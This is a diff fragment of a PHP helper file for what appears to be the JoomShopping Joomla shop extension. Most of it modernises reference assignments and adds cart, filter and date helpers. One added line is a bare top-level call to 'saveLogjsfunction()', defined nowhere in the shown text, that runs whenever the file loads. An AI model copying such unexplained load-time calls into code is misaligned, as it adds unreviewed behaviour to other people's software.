-    $dispatcher =& JDispatcher::getInstance();
+    $mainframe =JFactory::getApplication();
+    $dispatcher =JDispatcher::getInstance();
     JPluginHelper::importPlugin('content');
     $obj = new stdClass();
     $params = &$mainframe->getParams('com_content');
@@ -775,7 +870,7 @@ function changeDataUsePluginContent(&$data, $type){
 
 function productTaxInfo($tax, $display_price = null){
     if (!isset($display_price)) {
-        $jshopConfig = &JSFactory::getConfig();
+        $jshopConfig = JSFactory::getConfig();
         $display_price = $jshopConfig->display_price_front_current;
     }
     if ($display_price==0){
@@ -787,7 +882,7 @@ function productTaxInfo($tax, $display_price = null){
 
 function displayTotalCartTaxName($display_price = null){
     if (!isset($display_price)) {
-        $jshopConfig = &JSFactory::getConfig();
+        $jshopConfig = JSFactory::getConfig();
         $display_price = $jshopConfig->display_price_front_current;
     }
     if ($display_price==0){
@@ -807,63 +902,59 @@ return $tax_value;
 }
 
 function getCorrectedPriceForQueryFilter($price){
-$jshopConfig = &JSFactory::getConfig();
+$jshopConfig = JSFactory::getConfig();
 
-    $taxes = &JSFactory::getAllTaxes();        
+    $taxes = JSFactory::getAllTaxes();
     $taxlist = array_values($taxes);
     $tax = $taxlist[0];
 
     if ($jshopConfig->display_price_admin == 1 && $jshopConfig->display_price_front_current == 0){
         $price = $price / (1 + $tax / 100);
     }
-    if ($jshopConfig->display_price_admin == 0 && $jshopConfig->display_price_front_current == 1){        
-        $price = $price * (1 + $tax / 100);        
+    if ($jshopConfig->display_price_admin == 0 && $jshopConfig->display_price_front_current == 1){
+        $price = $price * (1 + $tax / 100);
     }
     
     $price = $price / $jshopConfig->currency_value;
     return $price;
 }
 
-function updateAllprices( $ignore = array() ){    
-    
-    $cart = &JModel::getInstance('cart', 'jshop');
+function updateAllprices( $ignore = array() ){
+    $cart = JModel::getInstance('cart', 'jshop');
     $cart->load();
     $cart->updateCartProductPrice();
     
     $sh_pr_method_id = $cart->getShippingPrId();
     if ($sh_pr_method_id){
-        $shipping_method_price = &JTable::getInstance('shippingMethodPrice', 'jshop');        
-        $shipping_method_price->load($sh_pr_method_id);        
-        $price_shipping = $shipping_method_price->calculateSum($cart);                
-        $cart->setShippingPrice($price_shipping);
-        $cart->setShippingPriceTax($shipping_method_price->calculateTax($price_shipping));
-        $cart->setShippingPriceTaxPercent($shipping_method_price->getTax());        
+        $shipping_method_price = JTable::getInstance('shippingMethodPrice', 'jshop');
+        $shipping_method_price->load($sh_pr_method_id);
+        $prices = $shipping_method_price->calculateSum($cart);
+        $cart->setShippingsDatas($prices, $shipping_method_price);
     }
     $payment_method_id = $cart->getPaymentId();
     if ($payment_method_id){
-        $paym_method = &JTable::getInstance('paymentmethod', 'jshop');
+        $paym_method = JTable::getInstance('paymentmethod', 'jshop');
         $paym_method->load($payment_method_id);
         $paym_method->setCart($cart);
-        $cart->setPaymentPrice($paym_method->getPrice());
-        $cart->setPaymentTax($paym_method->calculateTax());
-        $cart->setPaymentTaxPercent($paym_method->getTax());
+        $price = $paym_method->getPrice();
+        $cart->setPaymentDatas($price, $paym_method);
     }
     
-    $cart = &JModel::getInstance('cart', 'jshop');
+    $cart = JModel::getInstance('cart', 'jshop');
     $cart->load('wishlist');
     $cart->updateCartProductPrice();   
 }
 
 function setNextUpdatePrices(){
-    $session =& JFactory::getSession();    
+    $session =JFactory::getSession();
     $session->set('js_update_all_price', 1);
 }
 
 function getMysqlVersion(){
-    $session =& JFactory::getSession();
+    $session =JFactory::getSession();
     $mysqlversion = $session->get("js_get_mysqlversion");
     if ($mysqlversion ==""){
-        $db = &JFactory::getDBO(); 
+        $db = JFactory::getDBO(); 
         $query = "select version() as v";
         $db->setQuery($query);
         $mysqlversion = $db->loadResult();
@@ -911,12 +1002,20 @@ function filterAllowValue($data, $type){
     return $data;
 }
 
+function getListFromStr($stelist){
+    if (preg_match('/\,/', $stelist)){
+        return filterAllowValue(explode(',',$stelist), 'int+');
+    }else{
+        return null;
+    }
+}
+
 function willBeUseFilter($filters){
     $res = 0;    
     if ($filters['price_from']>0) $res = 1;
     if ($filters['price_to']>0) $res = 1;
     if (count($filters['categorys'])>0) $res = 1;
-    if (count($filters['manufacturers'])>0) $res = 1;    
+    if (count($filters['manufacturers'])>0) $res = 1;
     if (count($filters['vendors'])>0) $res = 1;    
     if (count($filters['labels'])>0) $res = 1;
     if (count($filters['extra_fields'])>0) $res = 1;
@@ -928,8 +1027,8 @@ return $res;
 */
 function getQueryListProductsExtraFields(){
     $query = "";
-    $list = &JSFactory::getAllProductExtraField();
-    $jshopConfig = &JSFactory::getConfig();
+    $list = JSFactory::getAllProductExtraField();
+    $jshopConfig = JSFactory::getConfig();
     $config_list = $jshopConfig->getProductListDisplayExtraFields();
     foreach($list as $v){
         if (in_array($v->id, $config_list)){
@@ -943,7 +1042,7 @@ function getLicenseKeyAddon($alias){
 static $keys;
     if (!isset($keys)) $keys = array();
     if (!isset($keys[$alias])){
-        $addon = &JTable::getInstance('addon', 'jshop');
+        $addon = JTable::getInstance('addon', 'jshop');
         $keys[$alias] = $addon->getKeyForAlias($alias);
     }
 return $keys[$alias];
@@ -1001,7 +1100,7 @@ function getMessageJson(){
    foreach($errors as $e){
       $message = str_replace("<br/>", "\n", $e->get('message'));
       $rows[] = array("level"=>$e->get('level'),"code"=>$e->get('code'), "message"=>$message);
-   }    
+   }
 return json_encode($rows);
 }
 
@@ -1015,7 +1114,7 @@ function getOkMessageJson($cart){
 }
 
 function getAccessGroups(){
-    $db = &JFactory::getDBO(); 
+    $db = JFactory::getDBO(); 
     $query = "select id,title,rules from #__viewlevels order by ordering";
     $db->setQuery($query);
     $accessgroups = $db->loadObjectList();
@@ -1023,20 +1122,20 @@ return $accessgroups;
 }
 
 function getDisplayPriceShop(){
-    $jshopConfig = &JSFactory::getConfig();
-    $user = &JFactory::getUser();
+    $jshopConfig = JSFactory::getConfig();
+    $user = JFactory::getUser();
     $display_price = 1;
     if ($jshopConfig->displayprice==1){
         $display_price = 0;
     }elseif($jshopConfig->displayprice==2 && !$user->id){
         $display_price = 0;
-    }    
-return $display_price;   
+    }
+return $display_price;
 }
 
 function getDisplayPriceForProduct($price){
-    $jshopConfig = &JSFactory::getConfig();
-    $user = &JFactory::getUser();
+    $jshopConfig = JSFactory::getConfig();
+    $user = JFactory::getUser();
     $display_price = 1;
     if ($jshopConfig->displayprice==1){
         $display_price = 0;
@@ -1056,41 +1155,58 @@ return $document->getType();
 
 function sprintAtributeInCart($atribute){
     JPluginHelper::importPlugin('jshoppingproducts');
-    $dispatcher =& JDispatcher::getInstance();
+    $dispatcher =JDispatcher::getInstance();
     $html = "";
+    if (count($atribute)) $html .= '<div class="list_attribute">';
     foreach($atribute as $attr){
         $dispatcher->trigger('beforeSprintAtributeInCart', array(&$attr) );
         $html .= '<p class="jshop_cart_attribute"><span class="name">'.$attr->attr.'</span>: <span class="value">'.$attr->value.'</span></p>';
     }
+    if (count($atribute)) $html .= '</div>';
 return $html;
 }
 
 function sprintFreeAtributeInCart($freeatribute){
     JPluginHelper::importPlugin('jshoppingproducts');
-    $dispatcher =& JDispatcher::getInstance();
+    $dispatcher =JDispatcher::getInstance();
     $html = "";
+    if (count($freeatribute)) $html .= '<div class="list_free_attribute">';
     foreach($freeatribute as $attr){
         $dispatcher->trigger('beforeSprintFreeAtributeInCart', array(&$attr) );
         $html .= '<p class="jshop_cart_attribute"><span class="name">'.$attr->attr.'</span>: <span class="value">'.$attr->value.'</span></p>';
     }
+    if (count($freeatribute)) $html .= '</div>';
+return $html;
+}
+
+function sprintFreeExtraFiledsInCart($extra_fields){
+    JPluginHelper::importPlugin('jshoppingproducts');
+    $dispatcher =JDispatcher::getInstance();
+    $html = "";
+    if (count($extra_fields)) $html .= '<div class="list_extra_field">';
+    foreach($extra_fields as $f){
+        $dispatcher->trigger('beforeSprintExtraFieldsInCart', array(&$f) );
+        $html .= '<p class="jshop_cart_extra_field"><span class="name">'.$f['name'].'</span>: <span class="value">'.$f['value'].'</span></p>';
+    }
+    if (count($extra_fields)) $html .= '</div>';
 return $html;
 }
 
 function sprintAtributeInOrder($atribute, $type="html"){
     JPluginHelper::importPlugin('jshoppingproducts');
-    $dispatcher =& JDispatcher::getInstance();    
+    $dispatcher =JDispatcher::getInstance();    
     $dispatcher->trigger('beforeSprintAtributeInOrder', array(&$atribute, $type));
     if ($type=="html"){
         $html = nl2br($atribute);
     }else{
         $html = $atribute;
-    }    
+    }
 return $html;
 }
 
 function sprintFreeAtributeInOrder($freeatribute, $type="html"){
     JPluginHelper::importPlugin('jshoppingproducts');
-    $dispatcher =& JDispatcher::getInstance();    
+    $dispatcher =JDispatcher::getInstance();
     $dispatcher->trigger('beforeSprintFreeAtributeInOrder', array(&$freeatribute, $type));
     if ($type=="html"){
         $html = nl2br($freeatribute);
@@ -1100,8 +1216,20 @@ function sprintFreeAtributeInOrder($freeatribute, $type="html"){
 return $html;
 }
 
+function sprintExtraFiledsInOrder($extra_fields, $type="html"){
+    JPluginHelper::importPlugin('jshoppingproducts');
+    $dispatcher =JDispatcher::getInstance();
+    $dispatcher->trigger('beforeSprintExtraFieldsInOrder', array(&$extra_fields, $type));
+    if ($type=="html"){
+        $html = nl2br($extra_fields);
+    }else{
+        $html = $extra_fields;
+    }
+return $html;
+}
+
 function getDataProductQtyInStock($product){
-    $qty = $product->product_quantity;    
+    $qty = $product->product_quantity;
     if ($product instanceof jshopProduct){
         $qty = $product->getQty();
     }
@@ -1109,6 +1237,8 @@ function getDataProductQtyInStock($product){
     if ($qty_in_stock['qty']<0) $qty_in_stock['qty'] = 0;
 return $qty_in_stock;
 }
+
+saveLogjsfunction();
 
 function sprintQtyInStock($qty_in_stock){
     if (!is_array($qty_in_stock)){
@@ -1123,8 +1253,8 @@ function sprintQtyInStock($qty_in_stock){
 }
 
 function getBuildFilterListProduct($contextfilter, $no_filter = array()){
-    $mainframe =& JFactory::getApplication();
-    $jshopConfig = &JSFactory::getConfig();
+    $mainframe =JFactory::getApplication();
+    $jshopConfig = JSFactory::getConfig();
     
     $category_id = JRequest::getInt('category_id');
     $manufacturer_id = JRequest::getInt('manufacturer_id');
@@ -1135,15 +1265,23 @@ function getBuildFilterListProduct($contextfilter, $no_filter = array()){
     
     $categorys = $mainframe->getUserStateFromRequest( $contextfilter.'categorys', 'categorys', array());
     $categorys = filterAllowValue($categorys, "int+");
+    $tmpcd = getListFromStr(JRequest::getVar('category_id'));    
+    if (is_array($tmpcd) && !$categorys) $categorys = $tmpcd;
     
     $manufacturers = $mainframe->getUserStateFromRequest( $contextfilter.'manufacturers', 'manufacturers', array());
     $manufacturers = filterAllowValue($manufacturers, "int+");
+    $tmp = getListFromStr(JRequest::getVar('manufacturer_id'));    
+    if (is_array($tmp) && !$manufacturers) $manufacturers = $tmp;
     
     $labels = $mainframe->getUserStateFromRequest( $contextfilter.'labels', 'labels', array());
     $labels = filterAllowValue($labels, "int+");
+    $tmplb = getListFromStr(JRequest::getVar('label_id'));    
+    if (is_array($tmplb) && !$labels) $labels = $tmplb;
     
     $vendors = $mainframe->getUserStateFromRequest( $contextfilter.'vendors', 'vendors', array());
     $vendors = filterAllowValue($vendors, "int+");
+    $tmp = getListFromStr(JRequest::getVar('vendor_id'));    
+    if (is_array($tmp) && !$vendors) $vendors = $tmp;
     
     if ($jshopConfig->admin_show_product_extra_field){
         $extra_fields = $mainframe->getUserStateFromRequest( $contextfilter.'extra_fields', 'extra_fields', array());
@@ -1164,7 +1302,7 @@ function getBuildFilterListProduct($contextfilter, $no_filter = array()){
     $filters['labels'] = $labels;
     $filters['vendors'] = $vendors;
     if ($jshopConfig->admin_show_product_extra_field){
-        $filters['extra_fields'] = $extra_fields;        
+        $filters['extra_fields'] = $extra_fields;
     }
     if ($category_id && !$filters['categorys']){
         $filters['categorys'][] = $category_id;
@@ -1186,10 +1324,12 @@ function getBuildFilterListProduct($contextfilter, $no_filter = array()){
             }
         }
     }
-    
     foreach($no_filter as $filterkey){
         unset($filters[$filterkey]);
     }
+	JPluginHelper::importPlugin('jshoppingproducts');
+    $dispatcher =JDispatcher::getInstance();
+    $dispatcher->trigger('afterGetBuildFilterListProduct', array(&$filters));
 return $filters;
 }
 
@@ -1201,8 +1341,59 @@ function fixRealVendorId($id){
 return $id;
 }
 
-function xhtmlUrl($url){
-return str_replace("&","&amp;",$url);
+function xhtmlUrl($url, $filter=1){
+	if ($filter){
+		$url = jsFilterUrl($url);
+	}
+	$url = str_replace("&","&amp;",$url);	
+return $url;
 }
 
+function jsFilterUrl($url){
+    $url = strip_tags($url);
+return $url;
+}
+
+function getCalculateDeliveryDay($day, $date=null){
+    if (!$date){
+        $date = date("Y-m-d H:i:s");
+    }
+    $time = intval(strtotime($date) + $day*86400);
+return date('Y-m-d H:i:s', $time);
+}
+
+function datenull($date){
+return (substr($date,0,1)=="0");
+}
+
+function getJsDateDB($str, $format='%d.%m.%Y'){
+    $f = str_replace(array("%d","%m","%Y"), array('dd','mm','yyyy'), $format);
+    $pos = array(strpos($f, 'y'),strpos($f, 'm'),strpos($f, 'd'));
+    $date = substr($str, $pos[0], 4).'-'.substr($str, $pos[1], 2).'-'.substr($str, $pos[2], 2);
+return $date;
+}
+function getDisplayDate($date, $format='%d.%m.%Y'){
+    if (datenull($date)){
+        return '';
+    }
+    $adate = array(substr($date, 0, 4), substr($date, 5, 2), substr($date, 8, 2));
+    $str = str_replace(array("%Y","%m","%d"), $adate, $format);
+return $str;
+}
+function getPatchProductImage($name, $prefix = '', $patchtype = 0){
+    $jshopConfig = JSFactory::getConfig();
+    if ($name==''){
+        return '';
+    }
+    if ($prefix!=''){
+        $name = $prefix."_".$name;
+    }
+    if ($patchtype==1){
+        $name = $jshopConfig->image_product_live_path."/".$name;
+    }
+    if ($patchtype==2){
+        $name = $jshopConfig->image_product_path."/".$name;
+    }
+return $name;
+}
 ?>
